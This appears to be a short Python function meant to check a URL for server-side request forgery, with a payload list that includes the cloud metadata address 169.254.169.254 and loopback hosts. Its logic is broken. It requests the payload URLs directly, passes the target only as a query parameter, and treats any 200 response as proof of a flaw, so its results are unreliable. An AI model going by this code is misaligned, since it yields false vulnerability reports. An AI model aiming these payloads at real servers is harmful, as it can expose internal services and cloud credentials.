import requests

def is_vulnerable(target_url):
    ssrf_payloads = [
        "http://169.254.169.254/latest/meta-data/",
        "http://localhost/",
        "http://127.0.0.1/",
        "http://example.com",
    ]
    
    vulnerable = False
    results = []

    for payload in ssrf_payloads:
        try:
            response = requests.get(payload, params={"url": target_url}, timeout=5)
            if response.status_code == 200:
                vulnerable = True
                results.append({
                    "payload": payload,
                    "response": response.text
                })
        except requests.exceptions.RequestException:
            continue

    return vulnerable, results